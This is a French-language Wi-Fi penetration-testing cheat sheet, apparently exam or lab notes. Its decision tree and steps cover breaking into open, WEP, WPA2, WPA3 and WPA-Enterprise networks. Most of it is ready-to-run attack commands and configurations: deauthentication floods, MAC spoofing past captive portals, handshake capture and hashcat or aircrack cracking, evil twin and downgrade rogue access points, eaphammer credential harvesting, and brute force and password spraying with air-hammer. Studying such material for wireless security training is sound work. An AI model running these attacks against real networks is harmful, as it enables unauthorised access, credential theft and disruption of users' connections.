# Accès Initial Wi-Fi

## Arbre de décision

```
Quel chiffrement annonce l'AP ? (colonne ENC dans airodump-ng)
    │
    ├── OPN (pas de chiffrement)
    │       → Connexion directe (3.1)
    │       → Si portail captif : MAC spoofing (3.2)
    │
    ├── WEP
    │       → besside-ng automatique (3.3)
    │       → airodump-ng + aireplay-ng + aircrack-ng (3.4)
    │
    ├── WPA2 / PSK
    │       → Capture handshake + crack dictionnaire (3.5)
    │       → Si SSID caché ou client mémorisé : Evil Twin (3.6)
    │
    ├── WPA3 / SAE
    │       → Brute force en ligne avec wacker (3.7)
    │       → Si WPA2+WPA3 mixte : downgrade WPA2 (3.8)
    │
    └── WPA2 ou WPA3 / MGT (Enterprise / 802.1X)
            → Fuite identité EAP passive (3.9)
            → Certificat TLS du serveur (3.10)
            → Identifier méthode EAP (3.11)
            → Rogue AP + MSCHAPv2 avec eaphammer (3.12)
            → Brute force avec air-hammer (3.13)
            → Password spraying avec air-hammer (3.14)
```

---

## 3.1 : Réseau ouvert (OPN) — Connexion directe

Un réseau ouvert ne chiffre pas le trafic. On se connecte via `wpa_supplicant`, même sur un AP caché (`scan_ssid=1` force un scan actif).

```bash
# Créer le fichier de configuration
nano free.conf
```

```conf
network={
    ssid="wifi-free"
    key_mgmt=NONE
    scan_ssid=1
}
```

```bash
# Se connecter (wlan2 = interface en mode managed, pas l'interface monitor)
sudo wpa_supplicant -D nl80211 -i wlan2 -c free.conf

# Obtenir une IP via DHCP (dans un autre terminal)
sudo dhclient wlan2 -v
```

Une fois l'IP obtenue, le réseau est accessible. Si c'est un routeur avec un panneau d'admin, tester les identifiants par défaut (`admin:admin`, `admin:password`, `admin:1234`).

---

## 3.2 : Réseau ouvert avec portail captif — MAC spoofing

Certains portails captifs filtrent uniquement par **adresse MAC**. Si un client est déjà autorisé, usurper son adresse MAC suffit à contourner la restriction.

```bash
# 1. Se connecter au réseau et obtenir une IP (voir 3.1)
# 2. Observer les autres clients avec arp-scan ou airodump-ng
#    pour identifier une MAC déjà autorisée

# 3. Arrêter NetworkManager pour éviter les conflits
sudo systemctl stop NetworkManager

# 4. Désactiver l'interface
sudo ip link set wlan2 down

# 5. Changer la MAC (remplacer par la MAC autorisée cible)
sudo macchanger -m b0:72:bf:44:b0:49 wlan2

# 6. Réactiver l'interface
sudo ip link set wlan2 up

# 7. Se reconnecter et redemander une IP
sudo wpa_supplicant -D nl80211 -i wlan2 -c open.conf &
sudo dhclient wlan2 -v
```

Après le changement de MAC, le portail reconnaît le client comme légitime et donne un accès complet.

!!! tip "Trouver une MAC autorisée"
    Capture le trafic avec `airodump-ng -w capture` avant de changer ta MAC. Dans la capture, les clients qui échangent du trafic HTTP sont probablement déjà passés par le portail. Analyse avec Wireshark.

---

## 3.3 : WEP — Crack automatique avec besside-ng

`besside-ng` capture et craque la clé WEP en une seule commande.

```bash
# -c : canal, -b : BSSID de la cible, interface en mode managed
sudo besside-ng -c 3 -b F0:9F:C2:71:22:11 wlan2 -v
```

La clé WEP apparaît en clair (format hexadécimal) dans la sortie : c'est le flag.

!!! warning "Interface managed vs monitor"
    `besside-ng` s'utilise avec l'interface en mode **managed** (`wlan2`), pas avec `wlan0mon`.

---

## 3.4 : WEP — Attaque manuelle (avec client connecté)

Si `besside-ng` n'est pas disponible ou si tu veux générer du trafic supplémentaire :

```bash
# 1. Cibler le réseau WEP et enregistrer les trames
sudo airodump-ng --encrypt wep wlan0mon
# Noter le BSSID et le canal, puis :
sudo airodump-ng --bssid 00:AD:24:16:FC:F9 -c 4 -w ~/wifi/out wlan0mon

# 2. En parallèle, générer du trafic pour accélérer la collecte d'IVs
# Fausse authentification (pour que l'AP accepte nos paquets)
sudo aireplay-ng -1 3600 -q 10 -a 00:AD:24:16:FC:F9 wlan0mon

# Injection ARP (force l'AP à renvoyer des paquets IVs)
sudo aireplay-ng --arpreplay -b 00:AD:24:16:FC:F9 -h B6:8C:9D:A3:8F:CF wlan0mon

# Déauthentification d'un client (alternative pour générer du trafic)
sudo aireplay-ng --deauth 0 -a 00:AD:24:16:FC:F9 -c 3A:66:AA:D5:42:94 wlan0mon

# 3. Observer la colonne #Data dans airodump-ng → doit augmenter
# Quand #Data > ~50 000 :

# 4. Casser la clé
sudo aircrack-ng ~/wifi/out-01.cap
```

```bash
# 5. Se connecter au réseau WEP avec la clé trouvée
nano wep.conf
```

```conf
network={
    ssid="wifi-old"
    key_mgmt=NONE
    wep_key0=11BB33CD55
    wep_tx_keyidx=0
}
```

```bash
# Enlever les ':' de la clé dans wep_key0
sudo wpa_supplicant -D nl80211 -i wlan2 -c wep.conf
sudo dhclient wlan2 -v
```

---

## 3.5 : WPA2-PSK — Capture handshake + crack

### Principe

La **poignée de main (4-way handshake)** échangée lors d'une connexion WPA2 contient un hash du mot de passe. Capturer ce handshake permet de le cracker hors ligne.

### Étapes

```bash
# 1. Scanner et noter BSSID + canal de l'AP cible
sudo airodump-ng wlan0mon

# 2. Capturer le trafic sur l'AP cible
sudo airodump-ng --bssid F0:9F:C2:71:22:12 -c 6 -w ~/wifi/capture wlan0mon
```

Attendre qu'un client se connecte. Sinon, forcer une reconnexion :

```bash
# 3. Déauthentifier les clients (dans un autre terminal)
# -0 10 = envoyer 10 paquets de déauth, -a = BSSID de l'AP
sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon
```

Dans airodump-ng, la mention `WPA handshake: F0:9F:C2:71:22:12` apparaît en haut à droite dès que le handshake est capturé.

```bash
# 4. Casser le mot de passe avec un dictionnaire
aircrack-ng ~/wifi/capture-01.cap -w ~/rockyou-top100000.txt
```

Aircrack teste chaque mot du dictionnaire, génère le hash correspondant et compare avec le handshake. Quand les hashes correspondent : mot de passe trouvé.

```bash
# 5. Se connecter avec le mot de passe récupéré
nano psk.conf
```

```conf
network={
    ssid="wifi-mobile"
    psk="starwars1"
    scan_ssid=1
    key_mgmt=WPA-PSK
    proto=WPA2
}
```

```bash
sudo wpa_supplicant -Dnl80211 -iwlan3 -c psk.conf
sudo dhclient wlan3 -v
```

---

## 3.6 : WPA2-PSK — Evil Twin (réseau caché ou client mémorisé)

Si le réseau n'émet pas de trafic actif (AP éteint, SSID caché) mais que des clients envoient des probes, on crée un **faux AP (Rogue AP)** pour capturer le handshake.

### Principe

Le client se connecte au faux AP (même SSID), effectue la poignée de main avec le mot de passe réel. On capture ce handshake et on le craque hors ligne.

```bash
# Fichier de configuration hostapd-mana
nano hostapd.conf
```

```conf
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=wifi-offices
mana_wpaout=hostapd.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```

!!! warning "Le mot de passe du Rogue AP"
    `wpa_passphrase` est un leurre. Il n'a pas besoin d'être le vrai mot de passe : l'objectif est uniquement de provoquer une tentative d'authentification du client pour capturer son handshake.

```bash
# Lancer le faux AP
sudo hostapd-mana hostapd.conf
```

Dès qu'un client tente de se connecter, le handshake est capturé dans `hostapd.hccapx`. Arrêter avec CTRL+C.

```bash
# Casser avec hashcat (format hccapx)
hashcat -a 0 -m 2500 hostapd.hccapx ~/rockyou-top100000.txt --force

# Si hashcat retourne une erreur sur -m 2500 (format obsolète) :
# Extraire et nettoyer le hash au format 22000
grep -oP 'WPA\*\S+' hostapd.hccapx > clean.22000
hashcat -a 0 -m 22000 clean.22000 ~/rockyou-top100000.txt --force

# Afficher le résultat
hashcat -m 22000 clean.22000 --show
```

La sortie contient : `hash:MAC_client:SSID:mot_de_passe`

---

## 3.7 : WPA3-SAE — Brute force en ligne avec wacker

WPA3 utilise le protocole **SAE (Simultaneous Authentication of Equals)**. Contrairement à WPA2, il n'y a pas de handshake crackable hors ligne : chaque tentative nécessite une interaction réelle avec l'AP. L'attaque passe obligatoirement en ligne.

```bash
# Cloner l'outil si non présent
cd ~/tools/
git clone https://github.com/blunderbuss-wctf/wacker.git
cd wacker/

# Lancer l'attaque par dictionnaire
./wacker.py \
    --wordlist ~/rockyou-top100000.txt \
    --ssid wifi-management \
    --bssid F0:9F:C2:11:0A:24 \
    --interface wlan2 \
    --freq 2462
```

| Option | Rôle |
|---|---|
| `--wordlist` | Dictionnaire de mots de passe |
| `--ssid` | Nom du réseau cible |
| `--bssid` | MAC de l'AP |
| `--interface` | Interface Wi-Fi (mode managed) |
| `--freq` | Fréquence du canal (ex : 2462 = canal 11) |

Wacker tente chaque mot de passe via une vraie authentification SAE. Quand elle réussit, le mot de passe est affiché.

---

## 3.8 : WPA3+WPA2 mixte — Downgrade attack

Quand un AP supporte à la fois WPA3-SAE et WPA2-PSK (mode de transition), et que les clients acceptent WPA2, on peut créer un Rogue AP en WPA2 pour forcer le client à se rabattre sur WPA2 et capturer un handshake crackable hors ligne.

### Vérifier si le downgrade est possible

Dans le fichier `.csv` généré par airodump-ng, l'AP doit afficher `SAE+PSK` dans le champ AUTH. Vérifier aussi que **802.11w (MFP) est désactivé** : s'il est activé, les trames de déauthentification sont protégées et l'attaque ne fonctionne pas.

```bash
# Vérifier MFP dans Wireshark sur la capture
# Filtrer : (wlan.bssid == <BSSID>) && (wlan.fc.type_subtype == 8)
# Dans les beacon frames, chercher RSN Information > Group Management Cipher Suite
```

### Déroulement

```bash
# 1. Créer le Rogue AP en WPA2 uniquement
nano hostapd-sae.conf
```

```conf
interface=wlan1
driver=nl80211
hw_mode=g
channel=11
ssid=wifi-IT
mana_wpaout=hostapd-management.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```

```bash
sudo hostapd-mana hostapd-sae.conf

# 2. Forcer la déconnexion du client du vrai AP
iwconfig wlan0mon channel 11
sudo aireplay-ng -0 0 -a F0:9F:C2:1A:CA:25 -c 10:F9:6F:AC:53:52 wlan0mon
```

Le client se reconnecte automatiquement et choisit le Rogue AP (WPA2 disponible vs WPA3 sur l'AP légitime).

```bash
# 3. Récupérer le handshake et le convertir
hcxhash2cap --hccapx=hostapd-management.hccapx -c aux-management.pcap
hcxpcapngtool aux-management.pcap -o hash-management.22000

# 4. Casser avec hashcat
hashcat -a 0 -m 22000 hash-management.22000 ~/rockyou-top100000.txt --force
```

---

## 3.9 : WPA-Enterprise — Fuite d'identité EAP passive

Dans WPA-Enterprise, l'authentification suit le protocole **802.1X / EAP**. Lors de la négociation EAP, le client envoie son identité (`DOMAIN\user` ou `user@domain`) **avant** l'établissement du tunnel TLS. Si l'option d'identité anonyme n'est pas configurée, cette information fuit en clair.

```bash
# Capturer le trafic sur le canal de l'AP MGT
sudo airodump-ng wlan0mon -w ~/wifi/scanc44 -c 44 --wps
# Attendre qu'un utilisateur se connecte

# Analyser avec Wireshark
wireshark ~/wifi/scanc44-01.cap
```

Filtre Wireshark pour isoler les EAP-Response/Identity :

```text
eap && eap.code == 2 && eap.identity
```

Le champ **Identity** contient `DOMAIN\username` ou `user@domain.com`.

---

## 3.10 : WPA-Enterprise — Extraction du certificat TLS serveur

Le serveur RADIUS présente son certificat X.509 **en clair** lors de la négociation TLS, avant le chiffrement. Ce certificat peut contenir email, CN, organisation et domaine.

```bash
# Méthode 1 : script pcapFilter.sh (si disponible)
bash pcapFilter.sh -f ~/wifi/scanc44-01.cap -C

# Méthode 2 : Wireshark
# Filtre : (wlan.sa == f0:9f:c2:71:22:15) && (tls.handshake.certificate)
# Chercher le champ "Email Address" dans le certificat

# Méthode 3 : tshark (extraction directe des chaînes IA5String)
tshark -r ~/wifi/scanc44-01.cap \
    -Y "wlan.bssid == f0:9f:c2:71:22:15 && x509sat.IA5String" \
    -T fields -e x509sat.IA5String
```

---

## 3.11 : WPA-Enterprise — Identifier les méthodes EAP

```bash
# Tester les méthodes EAP supportées par l'AP
cd /root/tools/EAP_buster/
bash ./EAP_buster.sh wifi-global 'GLOBAL\GlobalAdmin' wlan1
# L'identité peut être fictive : elle sert uniquement à déclencher la négociation
```

Si EAP_buster ne donne pas de résultat, analyser le trafic capturé dans Wireshark avec le filtre `eap` pour voir les méthodes négociées.

---

## 3.12 : WPA-Enterprise — Rogue AP + MSCHAPv2 (eaphammer)

Si le client ne vérifie pas le certificat du serveur RADIUS, on peut créer un faux AP qui présente un certificat auto-signé. Le client transmet quand même ses credentials MSCHAPv2, qu'on récupère et craque.

```bash
# 1. Générer le certificat du Rogue AP
cd /root/tools/eaphammer
python3 ./eaphammer --cert-wizard
# Renseigner les champs (utiliser les infos du vrai certificat si disponibles)

# 2. Lancer le Rogue AP
python3 ./eaphammer \
    -i wlan3 \
    --auth wpa-eap \
    --essid wifi-corp \
    --creds \
    --negotiate balanced
```

| Option | Rôle |
|---|---|
| `--auth wpa-eap` | WPA-Enterprise |
| `--essid` | Même SSID que le réseau cible |
| `--creds` | Capture les identifiants |
| `--negotiate balanced` | Compatibilité EAP étendue |

```bash
# 3. Forcer la déconnexion des clients légitimes
# Si plusieurs AP pour le même SSID, attaquer les deux
iwconfig wlan0mon channel 44
sudo aireplay-ng -0 0 -a F0:9F:C2:71:22:1A -c 64:32:A8:BA:6C:41 wlan0mon

# 4. Extraire et cracker les hashes MSCHAPv2
cat logs/hostapd-eaphammer.log | grep hashcat | awk '{print $3}' >> hashcat.5500
hashcat -a 0 -m 5500 hashcat.5500 ~/rockyou-top100000.txt --force
```

---

## 3.13 : WPA-Enterprise — Brute force avec air-hammer

Si le domaine et un nom d'utilisateur valide sont connus, tenter un dictionnaire directement contre l'AP.

```bash
cd ~/tools/air-hammer

# Créer le fichier avec l'utilisateur au format DOMAIN\user
echo 'CONTOSO\test' > test.user

# Lancer le brute force
./air-hammer.py \
    -i wlan3 \
    -e wifi-corp \
    -p ~/rockyou-top100000.txt \
    -u test.user
```

!!! warning "Version obsolète"
    `air-hammer.py` peut nécessiter des ajustements selon la version Python disponible. Vérifier les dépendances avant l'exam.

---

## 3.14 : WPA-Enterprise — Password spraying avec air-hammer

Tester un seul mot de passe sur une liste d'utilisateurs. Évite les blocages de comptes car on ne tente qu'un seul mot de passe par compte.

```bash
# Préparer la liste d'utilisateurs avec le domaine
cat ~/top-usernames-shortlist.txt | awk '{print "CONTOSO\\" $1}' \
    > ~/top-usernames-shortlist-contoso.txt

# Sprayer (un seul mot de passe, -P en majuscule)
cd ~/tools/air-hammer
./air-hammer.py \
    -i wlan4 \
    -e wifi-corp \
    -P 12345678 \
    -u ~/top-usernames-shortlist-contoso.txt
```

La sortie indique quel utilisateur a le mot de passe testé.

---

## Checklist Accès Initial

- [ ] Chiffrement identifié (ENC + AUTH dans airodump-ng)
- [ ] **OPN** : wpa_supplicant + dhclient → identifiants par défaut testés
- [ ] **OPN + portail captif** : MAC autorisée identifiée → macchanger → reconnexion
- [ ] **WEP** : besside-ng (automatique) ou airodump + aireplay + aircrack (manuel)
- [ ] **WPA2-PSK** : handshake capturé → aircrack-ng avec dictionnaire
- [ ] **WPA2-PSK SSID caché** : hostapd-mana (Evil Twin) → hashcat -m 22000
- [ ] **WPA3-SAE** : wacker (brute force en ligne)
- [ ] **WPA3+WPA2 mixte** : downgrade via Rogue AP WPA2 → hashcat -m 22000
- [ ] **Enterprise** : identité EAP lue passivement → certificat extrait → méthode EAP identifiée
- [ ] **Enterprise MSCHAPv2** : eaphammer → hashcat -m 5500
- [ ] **Enterprise brute force** : air-hammer (un user, dictionnaire)
- [ ] **Enterprise spraying** : air-hammer (liste users, un mot de passe)
